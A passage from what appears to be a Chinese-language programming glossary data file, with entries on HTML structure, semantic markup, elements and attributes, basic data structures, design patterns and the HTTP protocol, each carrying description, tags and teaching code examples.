                        <td>CSS</td>
                        <td>中级</td>
                        <td>2年</td>
                    </tr>
                </tbody>
            </table>
        </section>

        <section id="contact">
            <h2>联系我</h2>
            <!-- 表单 -->
            <form action="/submit" method="POST">
                <div>
                    <label for="name">姓名：</label>
                    <input type="text" id="name" name="name" required>
                </div>

                <div>
                    <label for="email">邮箱：</label>
                    <input type="email" id="email" name="email" required>
                </div>

                <div>
                    <label for="message">消息：</label>
                    <textarea id="message" name="message" rows="4" cols="50"></textarea>
                </div>

                <div>
                    <label for="gender">性别：</label>
                    <input type="radio" id="male" name="gender" value="male">
                    <label for="male">男</label>
                    <input type="radio" id="female" name="gender" value="female">
                    <label for="female">女</label>
                </div>

                <div>
                    <input type="checkbox" id="subscribe" name="subscribe">
                    <label for="subscribe">订阅新闻</label>
                </div>

                <button type="submit">提交</button>
                <button type="reset">重置</button>
            </form>
        </section>
    </main>

    <!-- 页面底部 -->
    <footer>
        <p>&copy; 2024 我的网站. 保留所有权利.</p>
        <address>
            联系邮箱: <a href="mailto:contact@example.com">contact@example.com</a>
        </address>
    </footer>

    <!-- JavaScript -->
    <script src="script.js"></script>
    <script>
        console.log("页面加载完成");
    </script>
</body>
</html>

<!-- HTML5语义化标签 -->
<article>
    <header>
        <h1>文章标题</h1>
        <time datetime="2024-01-01">2024年1月1日</time>
    </header>

    <section>
        <h2>章节标题</h2>
        <p>章节内容...</p>
    </section>

    <aside>
        <h3>相关链接</h3>
        <ul>
            <li><a href="#">链接1</a></li>
            <li><a href="#">链接2</a></li>
        </ul>
    </aside>

    <footer>
        <p>作者：张三</p>
    </footer>
</article>

<!-- 多媒体元素 -->
<video controls width="400">
    <source src="movie.mp4" type="video/mp4">
    <source src="movie.ogg" type="video/ogg">
    您的浏览器不支持视频标签。
</video>

<audio controls>
    <source src="audio.mp3" type="audio/mpeg">
    <source src="audio.ogg" type="audio/ogg">
    您的浏览器不支持音频标签。
</audio>

<!-- 嵌入内容 -->
<iframe src="https://www.example.com" width="400" height="300"></iframe>

<!-- 数据列表 -->
<datalist id="browsers">
    <option value="Chrome">
    <option value="Firefox">
    <option value="Safari">
    <option value="Edge">
</datalist>

<input list="browsers" name="browser" placeholder="选择浏览器">`,
      useCases: ['网页结构', '内容标记', 'SEO优化', '无障碍访问'],
      relatedTerms: ['css', 'javascript', 'dom', 'semantic html']
    },
    {
      id: 'html_2',
      name: 'semantic_html',
      chinese: '语义化HTML',
      description: '使用具有明确含义的HTML标签来描述内容的结构和意义，提高可访问性和SEO',
      difficulty: 'intermediate',
      tags: ['html', 'semantic', 'accessibility'],
      example: `<!-- 传统的非语义化HTML -->
<div class="header">
    <div class="nav">
        <div class="nav-item">首页</div>
        <div class="nav-item">关于</div>
    </div>
</div>

<div class="main">
    <div class="article">
        <div class="title">文章标题</div>
        <div class="content">文章内容...</div>
    </div>

    <div class="sidebar">
        <div class="widget">侧边栏内容</div>
    </div>
</div>

<div class="footer">
    <div class="copyright">版权信息</div>
</div>

<!-- 语义化HTML5 -->
<header>
    <nav>
        <ul>
            <li><a href="/">首页</a></li>
            <li><a href="/about">关于</a></li>
            <li><a href="/contact">联系</a></li>
        </ul>
    </nav>
</header>

<main>
    <article>
        <header>
            <h1>文章标题</h1>
            <p>发布于 <time datetime="2024-01-01T10:00:00">2024年1月1日</time></p>
            <address>作者：<a href="mailto:author@example.com">张三</a></address>
        </header>

        <section>
            <h2>第一章节</h2>
            <p>章节内容...</p>

            <figure>
                <img src="chart.png" alt="数据图表">
                <figcaption>图1：2024年数据统计</figcaption>
            </figure>
        </section>

        <section>
            <h2>第二章节</h2>
            <p>更多内容...</p>

            <blockquote cite="https://example.com">
                <p>这是一段引用的文字。</p>
                <footer>—— <cite>引用来源</cite></footer>
            </blockquote>
        </section>

        <footer>
            <p>标签：
                <span class="tag">HTML</span>
                <span class="tag">语义化</span>
            </p>
        </footer>
    </article>

    <aside>
        <section>
            <h3>相关文章</h3>
            <ul>
                <li><a href="#">HTML基础教程</a></li>
                <li><a href="#">CSS样式指南</a></li>
            </ul>
        </section>

        <section>
            <h3>最新评论</h3>
            <article>
                <header>
                    <h4>用户评论</h4>
                    <time datetime="2024-01-02T14:30:00">2小时前</time>
                </header>
                <p>很好的文章，学到了很多！</p>
            </article>
        </section>
    </aside>
</main>

<footer>
    <section>
        <h3>网站信息</h3>
        <p>&copy; 2024 我的网站</p>
        <address>
            联系我们：<a href="mailto:info@example.com">info@example.com</a>
        </address>
    </section>

    <nav>
        <h3>快速链接</h3>
        <ul>
            <li><a href="/privacy">隐私政策</a></li>
            <li><a href="/terms">使用条款</a></li>
            <li><a href="/sitemap">网站地图</a></li>
        </ul>
    </nav>
</footer>

<!-- 表单的语义化 -->
<form>
    <fieldset>
        <legend>个人信息</legend>

        <div>
            <label for="fullname">全名</label>
            <input type="text" id="fullname" name="fullname" required
                   aria-describedby="fullname-help">
            <small id="fullname-help">请输入您的真实姓名</small>
        </div>

        <div>
            <label for="birthdate">出生日期</label>
            <input type="date" id="birthdate" name="birthdate">
        </div>
    </fieldset>

    <fieldset>
        <legend>联系方式</legend>

        <div>
            <label for="email">邮箱地址</label>
            <input type="email" id="email" name="email" required
                   aria-describedby="email-error">
            <div id="email-error" role="alert" aria-live="polite"></div>
        </div>

        <div>
            <label for="phone">电话号码</label>
            <input type="tel" id="phone" name="phone"
                   pattern="[0-9]{3}-[0-9]{4}-[0-9]{4}"
                   placeholder="格式：123-4567-8901">
        </div>
    </fieldset>
</form>

<!-- 数据表格的语义化 -->
<table>
    <caption>2024年销售数据统计</caption>
    <thead>
        <tr>
            <th scope="col">月份</th>
            <th scope="col">销售额</th>
            <th scope="col">增长率</th>
        </tr>
    </thead>
    <tbody>
        <tr>
            <th scope="row">1月</th>
            <td>¥100,000</td>
            <td>+5%</td>
        </tr>
        <tr>
            <th scope="row">2月</th>
            <td>¥120,000</td>
            <td>+20%</td>
        </tr>
    </tbody>
    <tfoot>
        <tr>
            <th scope="row">总计</th>
            <td>¥220,000</td>
            <td>+12.5%</td>
        </tr>
    </tfoot>
</table>

<!-- 无障碍访问属性 -->
<button aria-label="关闭对话框" aria-expanded="false">
    <span aria-hidden="true">×</span>
</button>

<div role="tabpanel" aria-labelledby="tab1" aria-hidden="false">
    <h2 id="tab1">标签页内容</h2>
    <p>这里是标签页的内容...</p>
</div>

<!-- 微数据标记 -->
<article itemscope itemtype="http://schema.org/Article">
    <header>
        <h1 itemprop="headline">文章标题</h1>
        <time itemprop="datePublished" datetime="2024-01-01">2024年1月1日</time>
        <span itemprop="author" itemscope itemtype="http://schema.org/Person">
            作者：<span itemprop="name">张三</span>
        </span>
    </header>

    <div itemprop="articleBody">
        <p>文章正文内容...</p>
    </div>
</article>`,
      useCases: ['SEO优化', '无障碍访问', '屏幕阅读器', '搜索引擎理解'],
      relatedTerms: ['accessibility', 'seo', 'screen readers', 'microdata']
    },
    {
      id: 'html_3',
      name: 'html_elements',
      chinese: 'HTML元素',
      description: 'HTML文档的基本构建块，由开始标签、内容和结束标签组成',
      difficulty: 'beginner',
      tags: ['html', 'elements', 'tags'],
      example: `<!-- 基本HTML元素 -->

<!-- 文档结构元素 -->
<html>          <!-- 根元素 -->
<head>          <!-- 文档头部 -->
<body>          <!-- 文档主体 -->
<title>         <!-- 页面标题 -->
<meta>          <!-- 元数据 -->
<link>          <!-- 外部资源链接 -->
<script>        <!-- 脚本 -->
<style>         <!-- 样式 -->

<!-- 文本内容元素 -->
<h1> to <h6>    <!-- 标题元素 -->
<p>             <!-- 段落 -->
<span>          <!-- 行内容器 -->
<div>           <!-- 块级容器 -->
<br>            <!-- 换行 -->
<hr>            <!-- 水平分割线 -->

<!-- 文本格式化元素 -->
<strong>        <!-- 重要文本（粗体） -->
<em>            <!-- 强调文本（斜体） -->
<b>             <!-- 粗体文本 -->
<i>             <!-- 斜体文本 -->
<u>             <!-- 下划线文本 -->
<small>         <!-- 小号文本 -->
<mark>          <!-- 高亮文本 -->
<del>           <!-- 删除文本 -->
<ins>           <!-- 插入文本 -->
<sub>           <!-- 下标 -->
<sup>           <!-- 上标 -->

<!-- 链接和媒体元素 -->
<a href="url">  <!-- 超链接 -->
<img src="url" alt="描述">  <!-- 图片 -->
<video>         <!-- 视频 -->
<audio>         <!-- 音频 -->
<source>        <!-- 媒体资源 -->
<track>         <!-- 字幕轨道 -->

<!-- 列表元素 -->
<ul>            <!-- 无序列表 -->
<ol>            <!-- 有序列表 -->
<li>            <!-- 列表项 -->
<dl>            <!-- 描述列表 -->
<dt>            <!-- 描述术语 -->
<dd>            <!-- 描述定义 -->

<!-- 表格元素 -->
<table>         <!-- 表格 -->
<thead>         <!-- 表头组 -->
<tbody>         <!-- 表体组 -->
<tfoot>         <!-- 表脚组 -->
<tr>            <!-- 表格行 -->
<th>            <!-- 表头单元格 -->
<td>            <!-- 表格单元格 -->
<caption>       <!-- 表格标题 -->
<colgroup>      <!-- 列组 -->
<col>           <!-- 列 -->

<!-- 表单元素 -->
<form>          <!-- 表单 -->
<input>         <!-- 输入控件 -->
<textarea>      <!-- 多行文本输入 -->
<button>        <!-- 按钮 -->
<select>        <!-- 下拉选择 -->
<option>        <!-- 选项 -->
<optgroup>      <!-- 选项组 -->
<label>         <!-- 标签 -->
<fieldset>      <!-- 字段集 -->
<legend>        <!-- 字段集标题 -->
<datalist>      <!-- 数据列表 -->
<output>        <!-- 输出 -->

<!-- HTML5语义化元素 -->
<header>        <!-- 页眉 -->
<nav>           <!-- 导航 -->
<main>          <!-- 主要内容 -->
<section>       <!-- 章节 -->
<article>       <!-- 文章 -->
<aside>         <!-- 侧边栏 -->
<footer>        <!-- 页脚 -->
<figure>        <!-- 图形内容 -->
<figcaption>    <!-- 图形标题 -->
<details>       <!-- 详情 -->
<summary>       <!-- 摘要 -->
<time>          <!-- 时间 -->
<address>       <!-- 地址 -->
<blockquote>    <!-- 块引用 -->
<cite>          <!-- 引用来源 -->
<code>          <!-- 代码 -->
<pre>           <!-- 预格式化文本 -->
<kbd>           <!-- 键盘输入 -->
<samp>          <!-- 示例输出 -->
<var>           <!-- 变量 -->

<!-- 嵌入内容元素 -->
<iframe>        <!-- 内联框架 -->
<embed>         <!-- 嵌入内容 -->
<object>        <!-- 对象 -->
<param>         <!-- 参数 -->
<canvas>        <!-- 画布 -->
<svg>           <!-- 可缩放矢量图形 -->

<!-- 示例：完整的HTML文档结构 -->
<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>HTML元素示例</title>
</head>
<body>
    <header>
        <h1>网站标题</h1>
        <nav>
            <ul>
                <li><a href="#home">首页</a></li>
                <li><a href="#about">关于</a></li>
            </ul>
        </nav>
    </header>

    <main>
        <article>
            <h2>文章标题</h2>
            <p>这是一个<strong>重要</strong>的段落，包含<em>强调</em>的文本。</p>

            <figure>
                <img src="example.jpg" alt="示例图片">
                <figcaption>图片说明</figcaption>
            </figure>

            <blockquote cite="https://example.com">
                <p>这是一段引用的文字。</p>
            </blockquote>
        </article>

        <aside>
            <h3>相关链接</h3>
            <ul>
                <li><a href="#">链接1</a></li>
                <li><a href="#">链接2</a></li>
            </ul>
        </aside>
    </main>

    <footer>
        <p>&copy; 2024 版权所有</p>
    </footer>
</body>
</html>`,
      useCases: ['文档结构', '内容标记', '语义化', '样式应用'],
      relatedTerms: ['tags', 'attributes', 'nesting', 'semantic markup']
    },
    {
      id: 'html_4',
      name: 'html_attributes',
      chinese: 'HTML属性',
      description: 'HTML元素的附加信息，用于修改元素的行为或提供额外的数据',
      difficulty: 'beginner',
      tags: ['html', 'attributes', 'properties'],
      example: `<!-- 全局属性（所有元素都可以使用） -->
<div id="unique-id">                    <!-- id: 唯一标识符 -->
<div class="css-class another-class">   <!-- class: CSS类名 -->
<div style="color: red; font-size: 16px;">  <!-- style: 内联样式 -->
<div title="提示文本">                  <!-- title: 提示信息 -->
<div lang="zh-CN">                      <!-- lang: 语言 -->
<div dir="ltr">                         <!-- dir: 文本方向 -->
<div hidden>                            <!-- hidden: 隐藏元素 -->
<div contenteditable="true">            <!-- contenteditable: 可编辑 -->
<div draggable="true">                  <!-- draggable: 可拖拽 -->
<div tabindex="1">                      <!-- tabindex: Tab键顺序 -->
<div data-custom="value">               <!-- data-*: 自定义数据属性 -->

<!-- 链接属性 -->
<a href="https://example.com">          <!-- href: 链接地址 -->
<a href="mailto:user@example.com">      <!-- mailto: 邮件链接 -->
<a href="tel:+1234567890">              <!-- tel: 电话链接 -->
<a target="_blank">                     <!-- target: 打开方式 -->
<a rel="noopener noreferrer">           <!-- rel: 关系类型 -->
<a download="filename.pdf">             <!-- download: 下载文件名 -->
<a hreflang="en">                       <!-- hreflang: 链接语言 -->

<!-- 图片属性 -->
<img src="image.jpg">                   <!-- src: 图片源 -->
<img alt="图片描述">                    <!-- alt: 替代文本 -->
<img width="300">                       <!-- width: 宽度 -->
<img height="200">                      <!-- height: 高度 -->
<img loading="lazy">                    <!-- loading: 加载方式 -->
<img srcset="small.jpg 480w, large.jpg 800w">  <!-- srcset: 响应式图片 -->
<img sizes="(max-width: 600px) 480px, 800px">  <!-- sizes: 尺寸描述 -->

<!-- 表单属性 -->
<form action="/submit">                 <!-- action: 提交地址 -->
<form method="POST">                    <!-- method: 提交方法 -->
<form enctype="multipart/form-data">    <!-- enctype: 编码类型 -->
<form autocomplete="off">               <!-- autocomplete: 自动完成 -->
<form novalidate>                       <!-- novalidate: 禁用验证 -->

<!-- 输入控件属性 -->
<input type="text">                     <!-- type: 输入类型 -->
<input name="username">                 <!-- name: 字段名 -->
<input value="默认值">                  <!-- value: 默认值 -->
<input placeholder="请输入用户名">       <!-- placeholder: 占位符 -->
<input required>                        <!-- required: 必填 -->
<input readonly>                        <!-- readonly: 只读 -->
<input disabled>                        <!-- disabled: 禁用 -->
<input maxlength="50">                  <!-- maxlength: 最大长度 -->
<input minlength="3">                   <!-- minlength: 最小长度 -->
<input pattern="[A-Za-z]{3}">          <!-- pattern: 正则验证 -->
<input autocomplete="username">         <!-- autocomplete: 自动完成类型 -->
<input autofocus>                       <!-- autofocus: 自动聚焦 -->

<!-- 不同输入类型的特殊属性 -->
<input type="number" min="0" max="100" step="5">    <!-- 数字输入 -->
<input type="range" min="0" max="100" value="50">   <!-- 滑块 -->
<input type="date" min="2024-01-01" max="2024-12-31">  <!-- 日期 -->
<input type="email" multiple>                       <!-- 邮箱（多个） -->
<input type="file" accept=".jpg,.png" multiple>     <!-- 文件上传 -->
<input type="checkbox" checked>                     <!-- 复选框 -->
<input type="radio" checked>                        <!-- 单选框 -->

<!-- 文本区域属性 -->
<textarea rows="4" cols="50">           <!-- rows/cols: 行列数 -->
<textarea wrap="soft">                  <!-- wrap: 换行方式 -->
<textarea resize="vertical">            <!-- resize: 调整大小 -->

<!-- 选择框属性 -->
<select multiple>                       <!-- multiple: 多选 -->
<select size="5">                       <!-- size: 显示选项数 -->
<option value="1" selected>             <!-- selected: 默认选中 -->
<option disabled>                       <!-- disabled: 禁用选项 -->

<!-- 按钮属性 -->
<button type="submit">                  <!-- type: 按钮类型 -->
<button type="reset">                   <!-- reset: 重置按钮 -->
<button type="button">                  <!-- button: 普通按钮 -->
<button form="form-id">                 <!-- form: 关联表单 -->

<!-- 标签属性 -->
<label for="input-id">                  <!-- for: 关联输入控件 -->

<!-- 表格属性 -->
<table border="1">                      <!-- border: 边框 -->
<th scope="col">                        <!-- scope: 作用域 -->
<th colspan="2">                        <!-- colspan: 跨列 -->
<td rowspan="3">                        <!-- rowspan: 跨行 -->

<!-- 媒体属性 -->
<video controls>                        <!-- controls: 显示控件 -->
<video autoplay>                        <!-- autoplay: 自动播放 -->
<video loop>                            <!-- loop: 循环播放 -->
<video muted>                           <!-- muted: 静音 -->
<video poster="thumbnail.jpg">          <!-- poster: 封面图 -->
<video preload="metadata">              <!-- preload: 预加载 -->

<!-- 框架属性 -->
<iframe src="page.html">                <!-- src: 源地址 -->
<iframe width="400" height="300">       <!-- 尺寸 -->
<iframe frameborder="0">                <!-- frameborder: 边框 -->
<iframe sandbox="allow-scripts">        <!-- sandbox: 安全限制 -->

<!-- 元数据属性 -->
<meta charset="UTF-8">                  <!-- charset: 字符编码 -->
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta name="description" content="页面描述">
<meta name="keywords" content="关键词1,关键词2">
<meta name="author" content="作者名">
<meta http-equiv="refresh" content="30">

<!-- 链接资源属性 -->
<link rel="stylesheet" href="style.css">    <!-- 样式表 -->
<link rel="icon" href="favicon.ico">        <!-- 图标 -->
<link rel="canonical" href="https://example.com">  <!-- 规范链接 -->
<link rel="alternate" hreflang="en" href="en.html">  <!-- 替代版本 -->

<!-- 脚本属性 -->
<script src="script.js">                <!-- src: 脚本源 -->
<script async>                          <!-- async: 异步加载 -->
<script defer>                          <!-- defer: 延迟执行 -->
<script type="module">                  <!-- type: 脚本类型 -->

<!-- 事件属性 -->
<button onclick="handleClick()">        <!-- onclick: 点击事件 -->
<input onchange="handleChange()">       <!-- onchange: 改变事件 -->
<body onload="handleLoad()">            <!-- onload: 加载事件 -->
<form onsubmit="handleSubmit()">        <!-- onsubmit: 提交事件 -->`,
      useCases: ['元素配置', '样式控制', '行为定义', '数据传递'],
      relatedTerms: ['properties', 'values', 'global attributes', 'event handlers']
    }
  ],

  // 数据结构 (40个术语)
  datastructures: [
    {
      id: 'ds_1',
      name: 'array',
      chinese: '数组',
      description: '存储相同类型元素的有序集合，通过索引访问元素',
      difficulty: 'beginner',
      tags: ['data-structure', 'collection', 'indexed'],
      example: `// JavaScript数组
let numbers = [1, 2, 3, 4, 5];
let fruits = ["apple", "banana", "orange"];

// 数组操作
numbers.push(6);           // 添加元素到末尾
numbers.pop();             // 删除末尾元素
numbers.unshift(0);        // 添加元素到开头
numbers.shift();           // 删除开头元素

// 数组方法
let doubled = numbers.map(x => x * 2);
let evens = numbers.filter(x => x % 2 === 0);
let sum = numbers.reduce((acc, x) => acc + x, 0);

// 多维数组
let matrix = [
    [1, 2, 3],
    [4, 5, 6],
    [7, 8, 9]
];

console.log(matrix[1][2]); // 访问第2行第3列：6

// Python数组（列表）
numbers = [1, 2, 3, 4, 5]
fruits = ["apple", "banana", "orange"]

# 列表操作
numbers.append(6)          # 添加元素
numbers.insert(0, 0)       # 在指定位置插入
numbers.remove(3)          # 删除指定值
popped = numbers.pop()     # 删除并返回末尾元素

# 列表推导式
squares = [x**2 for x in range(10)]
evens = [x for x in numbers if x % 2 == 0]

// Java数组
int[] numbers = {1, 2, 3, 4, 5};
String[] fruits = {"apple", "banana", "orange"};

// 数组长度
System.out.println(numbers.length);

// 遍历数组
for (int i = 0; i < numbers.length; i++) {
    System.out.println(numbers[i]);
}

// 增强for循环
for (int num : numbers) {
    System.out.println(num);
}`,
      useCases: ['数据存储', '批量处理', '索引访问', '算法实现'],
      relatedTerms: ['list', 'index', 'iteration', 'collection']
    },
    {
      id: 'ds_2',
      name: 'linked_list',
      chinese: '链表',
      description: '由节点组成的线性数据结构，每个节点包含数据和指向下一个节点的指针',
      difficulty: 'intermediate',
      tags: ['data-structure', 'pointers', 'dynamic'],
      example: `// JavaScript链表实现
class ListNode {
    constructor(val = 0, next = null) {
        this.val = val;
        this.next = next;
    }
}

class LinkedList {
    constructor() {
        this.head = null;
        this.size = 0;
    }

    // 在头部插入
    prepend(val) {
        const newNode = new ListNode(val, this.head);
        this.head = newNode;
        this.size++;
    }

    // 在尾部插入
    append(val) {
        const newNode = new ListNode(val);

        if (!this.head) {
            this.head = newNode;
        } else {
            let current = this.head;
            while (current.next) {
                current = current.next;
            }
            current.next = newNode;
        }
        this.size++;
    }

    // 删除节点
    remove(val) {
        if (!this.head) return false;

        if (this.head.val === val) {
            this.head = this.head.next;
            this.size--;
            return true;
        }

        let current = this.head;
        while (current.next && current.next.val !== val) {
            current = current.next;
        }

        if (current.next) {
            current.next = current.next.next;
            this.size--;
            return true;
        }

        return false;
    }

    // 查找节点
    find(val) {
        let current = this.head;
        while (current) {
            if (current.val === val) return current;
            current = current.next;
        }
        return null;
    }

    // 转换为数组
    toArray() {
        const result = [];
        let current = this.head;
        while (current) {
            result.push(current.val);
            current = current.next;
        }
        return result;
    }
}`,
      useCases: ['动态数据存储', '插入删除频繁', '内存效率', '栈和队列实现'],
      relatedTerms: ['array', 'pointer', 'node', 'traversal']
    },
    {
      id: 'ds_3',
      name: 'hash_table',
      chinese: '哈希表',
      description: '通过哈希函数将键映射到数组索引的数据结构，提供快速的查找、插入和删除操作',
      difficulty: 'intermediate',
      tags: ['data-structure', 'hashing', 'key-value'],
      example: `// JavaScript哈希表实现
class HashTable {
    constructor(size = 10) {
        this.size = size;
        this.buckets = new Array(size).fill(null).map(() => []);
    }

    // 哈希函数
    hash(key) {
        let hash = 0;
        for (let i = 0; i < key.length; i++) {
            hash = (hash + key.charCodeAt(i) * i) % this.size;
        }
        return hash;
    }

    // 设置键值对
    set(key, value) {
        const index = this.hash(key);
        const bucket = this.buckets[index];

        // 检查是否已存在
        const existingPair = bucket.find(pair => pair[0] === key);
        if (existingPair) {
            existingPair[1] = value;
        } else {
            bucket.push([key, value]);
        }
    }

    // 获取值
    get(key) {
        const index = this.hash(key);
        const bucket = this.buckets[index];
        const pair = bucket.find(pair => pair[0] === key);
        return pair ? pair[1] : undefined;
    }

    // 删除键值对
    delete(key) {
        const index = this.hash(key);
        const bucket = this.buckets[index];
        const pairIndex = bucket.findIndex(pair => pair[0] === key);

        if (pairIndex !== -1) {
            bucket.splice(pairIndex, 1);
            return true;
        }
        return false;
    }

    // 获取所有键
    keys() {
        return this.buckets.flat().map(pair => pair[0]);
    }

    // 获取所有值
    values() {
        return this.buckets.flat().map(pair => pair[1]);
    }
}

// 使用示例
const hashTable = new HashTable();
hashTable.set('name', 'Alice');
hashTable.set('age', 25);
hashTable.set('city', 'New York');

console.log(hashTable.get('name')); // 'Alice'
console.log(hashTable.keys()); // ['name', 'age', 'city']`,
      useCases: ['快速查找', '缓存实现', '数据库索引', '去重操作'],
      relatedTerms: ['hash function', 'collision', 'bucket', 'load factor']
    },
    {
      id: 'ds_4',
      name: 'stack',
      chinese: '栈',
      description: '后进先出(LIFO)的数据结构，只能在一端进行插入和删除操作',
      difficulty: 'beginner',
      tags: ['data-structure', 'lifo', 'linear'],
      example: `// JavaScript栈实现
class Stack {
    constructor() {
        this.items = [];
    }

    // 入栈
    push(element) {
        this.items.push(element);
    }

    // 出栈
    pop() {
        if (this.isEmpty()) {
            return null;
        }
        return this.items.pop();
    }

    // 查看栈顶元素
    peek() {
        if (this.isEmpty()) {
            return null;
        }
        return this.items[this.items.length - 1];
    }

    // 检查是否为空
    isEmpty() {
        return this.items.length === 0;
    }

    // 获取栈大小
    size() {
        return this.items.length;
    }

    // 清空栈
    clear() {
        this.items = [];
    }

    // 转换为数组
    toArray() {
        return [...this.items];
    }
}

// 使用示例
const stack = new Stack();
stack.push(1);
stack.push(2);
stack.push(3);

console.log(stack.peek()); // 3
console.log(stack.pop());  // 3
console.log(stack.size()); // 2

// 栈的应用：括号匹配
function isValidParentheses(s) {
    const stack = new Stack();
    const pairs = {
        ')': '(',
        '}': '{',
        ']': '['
    };

    for (let char of s) {
        if (char === '(' || char === '{' || char === '[') {
            stack.push(char);
        } else if (char === ')' || char === '}' || char === ']') {
            if (stack.isEmpty() || stack.pop() !== pairs[char]) {
                return false;
            }
        }
    }

    return stack.isEmpty();
}

console.log(isValidParentheses("()[]{}"));   // true
console.log(isValidParentheses("([)]"));     // false

// Python栈实现
class Stack:
    def __init__(self):
        self.items = []

    def push(self, item):
        self.items.append(item)

    def pop(self):
        if not self.is_empty():
            return self.items.pop()
        return None

    def peek(self):
        if not self.is_empty():
            return self.items[-1]
        return None

    def is_empty(self):
        return len(self.items) == 0

    def size(self):
        return len(self.items)

# 使用Python列表作为栈
stack = []
stack.append(1)  # push
stack.append(2)  # push
stack.append(3)  # push

print(stack[-1])  # peek: 3
print(stack.pop())  # pop: 3
print(len(stack))   # size: 2`,
      useCases: ['函数调用', '表达式求值', '括号匹配', '撤销操作'],
      relatedTerms: ['lifo', 'push', 'pop', 'call stack']
    },
    {
      id: 'ds_5',
      name: 'queue',
      chinese: '队列',
      description: '先进先出(FIFO)的数据结构，在一端插入元素，在另一端删除元素',
      difficulty: 'beginner',
      tags: ['data-structure', 'fifo', 'linear'],
      example: `// JavaScript队列实现
class Queue {
    constructor() {
        this.items = [];
    }

    // 入队
    enqueue(element) {
        this.items.push(element);
    }

    // 出队
    dequeue() {
        if (this.isEmpty()) {
            return null;
        }
        return this.items.shift();
    }

    // 查看队首元素
    front() {
        if (this.isEmpty()) {
            return null;
        }
        return this.items[0];
    }

    // 查看队尾元素
    rear() {
        if (this.isEmpty()) {
            return null;
        }
        return this.items[this.items.length - 1];
    }

    // 检查是否为空
    isEmpty() {
        return this.items.length === 0;
    }

    // 获取队列大小
    size() {
        return this.items.length;
    }

    // 清空队列
    clear() {
        this.items = [];
    }
}

// 使用示例
const queue = new Queue();
queue.enqueue("Alice");
queue.enqueue("Bob");
queue.enqueue("Charlie");

console.log(queue.front()); // "Alice"
console.log(queue.dequeue()); // "Alice"
console.log(queue.size()); // 2

// 优先队列实现
class PriorityQueue {
    constructor() {
        this.items = [];
    }

    enqueue(element, priority) {
        const queueElement = { element, priority };
        let added = false;

        for (let i = 0; i < this.items.length; i++) {
            if (queueElement.priority < this.items[i].priority) {
                this.items.splice(i, 0, queueElement);
                added = true;
                break;
            }
        }

        if (!added) {
            this.items.push(queueElement);
        }
    }

    dequeue() {
        if (this.isEmpty()) {
            return null;
        }
        return this.items.shift().element;
    }

    isEmpty() {
        return this.items.length === 0;
    }
}

// 使用优先队列
const pq = new PriorityQueue();
pq.enqueue("低优先级任务", 3);
pq.enqueue("高优先级任务", 1);
pq.enqueue("中优先级任务", 2);

console.log(pq.dequeue()); // "高优先级任务"
console.log(pq.dequeue()); // "中优先级任务"

// Python队列实现
from collections import deque

# 使用deque实现队列
queue = deque()
queue.append("Alice")    # enqueue
queue.append("Bob")      # enqueue
queue.append("Charlie")  # enqueue

print(queue[0])          # front: "Alice"
print(queue.popleft())   # dequeue: "Alice"
print(len(queue))        # size: 2

# 使用queue模块
import queue

# FIFO队列
q = queue.Queue()
q.put("item1")
q.put("item2")
item = q.get()  # "item1"

# 优先队列
pq = queue.PriorityQueue()
pq.put((1, "高优先级"))
pq.put((3, "低优先级"))
pq.put((2, "中优先级"))

priority, item = pq.get()  # (1, "高优先级")`,
      useCases: ['任务调度', '广度优先搜索', '缓冲区', '打印队列'],
      relatedTerms: ['fifo', 'enqueue', 'dequeue', 'priority queue']
    }
  ],

  // 软件工程 (25个术语)
  softwareengineering: [
    {
      id: 'se_1',
      name: 'design_patterns',
      chinese: '设计模式',
      description: '软件设计中常见问题的可重用解决方案，提供了经过验证的设计经验',
      difficulty: 'advanced',
      tags: ['design', 'patterns', 'architecture'],
      example: `// 单例模式 (Singleton Pattern)
class Singleton {
    constructor() {
        if (Singleton.instance) {
            return Singleton.instance;
        }

        this.data = {};
        Singleton.instance = this;
        return this;
    }

    setData(key, value) {
        this.data[key] = value;
    }

    getData(key) {
        return this.data[key];
    }
}

// 工厂模式 (Factory Pattern)
class AnimalFactory {
    static createAnimal(type) {
        switch (type) {
            case 'dog':
                return new Dog();
            case 'cat':
                return new Cat();
            default:
                throw new Error('Unknown animal type');
        }
    }
}

class Dog {
    speak() { return 'Woof!'; }
}

class Cat {
    speak() { return 'Meow!'; }
}

// 观察者模式 (Observer Pattern)
class Subject {
    constructor() {
        this.observers = [];
    }

    subscribe(observer) {
        this.observers.push(observer);
    }

    unsubscribe(observer) {
        this.observers = this.observers.filter(obs => obs !== observer);
    }

    notify(data) {
        this.observers.forEach(observer => observer.update(data));
    }
}

class Observer {
    constructor(name) {
        this.name = name;
    }

    update(data) {
        console.log(\`\${this.name} received: \${data}\`);
    }
}

// 装饰器模式 (Decorator Pattern)
class Coffee {
    cost() { return 5; }
    description() { return 'Simple coffee'; }
}

class MilkDecorator {
    constructor(coffee) {
        this.coffee = coffee;
    }

    cost() {
        return this.coffee.cost() + 2;
    }

    description() {
        return this.coffee.description() + ', milk';
    }
}`,
      useCases: ['代码复用', '系统架构', '维护性提升', '团队协作'],
      relatedTerms: ['singleton', 'factory', 'observer', 'decorator']
    }
  ],

  // 网络编程 (20个术语)
  networking: [
    {
      id: 'net_1',
      name: 'http_protocol',
      chinese: 'HTTP协议',
      description: '超文本传输协议，用于在Web浏览器和服务器之间传输数据的应用层协议',
      difficulty: 'intermediate',
      tags: ['protocol', 'web', 'communication'],
      example: `// HTTP请求示例
// GET请求
fetch('https://api.example.com/users')
  .then(response => response.json())
  .then(data => console.log(data));

// POST请求
fetch('https://api.example.com/users', {
  method: 'POST',
  headers: {
    'Content-Type': 'application/json',
    'Authorization': 'Bearer token123'
  },
  body: JSON.stringify({
    name: 'Alice',
    email: 'alice@example.com'
  })
})
.then(response => response.json())
.then(data => console.log(data));

// HTTP状态码处理
async function handleRequest(url) {
  try {
    const response = await fetch(url);

    switch (response.status) {
      case 200:
        return await response.json();
      case 404:
        throw new Error('Resource not found');
      case 500:
        throw new Error('Server error');
      default:
        throw new Error(\`HTTP \${response.status}: \${response.statusText}\`);
    }
  } catch (error) {
    console.error('Request failed:', error);
    throw error;
  }
}

// Express.js服务器示例
const express = require('express');
const app = express();

app.use(express.json());

// GET路由
app.get('/api/users', (req, res) => {
  res.json({ users: [] });
});

// POST路由
app.post('/api/users', (req, res) => {
  const { name, email } = req.body;

  if (!name || !email) {
    return res.status(400).json({
      error: 'Name and email are required'
    });
  }

  res.status(201).json({
    id: Date.now(),
    name,
    email
